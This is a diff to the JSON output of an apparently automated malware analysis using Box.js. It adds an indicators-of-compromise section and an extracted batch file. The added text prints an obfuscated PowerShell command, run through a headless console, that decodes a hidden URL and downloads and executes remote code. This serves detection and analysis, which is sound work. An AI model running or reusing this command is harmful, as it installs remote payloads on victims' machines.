@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 60,
+    "score": 61,
     "sections": [
       {
         "auto_collapse": false,
@@ -159,15 +159,68 @@
         "tags": {},
         "title_text": "Signature: SuspiciousProcess",
         "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "IOCs extracted by Box.js",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "time\nless powershel\nconhost --headless powershell @(3177,3156,3158,3157,3177,3156,3101,3171,3166,3167,3102,3104,3101,3167,3159,3167,3118,3159,3152,3170,3159,3116)|foreach{$uvyjorbfmxgs=$uvyjorbfmxgs+[char]($_-3055);$zjbwcrmaehks=$uvyjorbfmxgs};$kzldeg='l'; new-alias tixxs cur$kzldeg;$afswe=('sduzu',$zjbwcrmaehks);.$([char](8892-8787)+'ex')(tixxs -useb \"$afswe[1]\")",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "time",
+                "less powershel",
+                "conhost --headless powershell @(3177,3156,3158,3157,3177,3156,3101,3171,3166,3167,3102,3104,3101,3167,3159,3167,3118,3159,3152,3170,3159,3116)|foreach{$uvyjorbfmxgs=$uvyjorbfmxgs+[char]($_-3055);$zjbwcrmaehks=$uvyjorbfmxgs};$kzldeg='l'; new-alias tixxs cur$kzldeg;$afswe=('sduzu',$zjbwcrmaehks);.$([char](8892-8787)+'ex')(tixxs -useb \"$afswe[1]\")"
+              ]
+            }
+          }
+        },
+        "title_text": "The script ran the following commands",
+        "zeroize_on_tag_safe": false
       }
     ]
   },
   "files": {
-    "extracted": [],
+    "extracted": [
+      {
+        "name": "boxjs_cmds.bat",
+        "sha256": "49dc7ea3872aaceb69779648ecd0dba8560c421682508a90c42a6f266cef4954"
+      }
+    ],
     "supplementary": []
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
       {
         "attack_ids": [],
         "heur_id": 3,
@@ -211,7 +264,25 @@
         ]
       }
     ],
-    "tags": {},
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "conhost --headless powershell @(3177,3156,3158,3157,3177,3156,3101,3171,3166,3167,3102,3104,3101,3167,3159,3167,3118,3159,3152,3170,3159,3116)|foreach{$uvyjorbfmxgs=$uvyjorbfmxgs+[char]($_-3055);$zjbwcrmaehks=$uvyjorbfmxgs};$kzldeg='l'; new-alias tixxs cur$kzldeg;$afswe=('sduzu',$zjbwcrmaehks);.$([char](8892-8787)+'ex')(tixxs -useb \"$afswe[1]\")"
+        },
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "less powershel"
+        },
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "time"
+        }
+      ]
+    },
     "temp_submission_data": {}
   }
 }
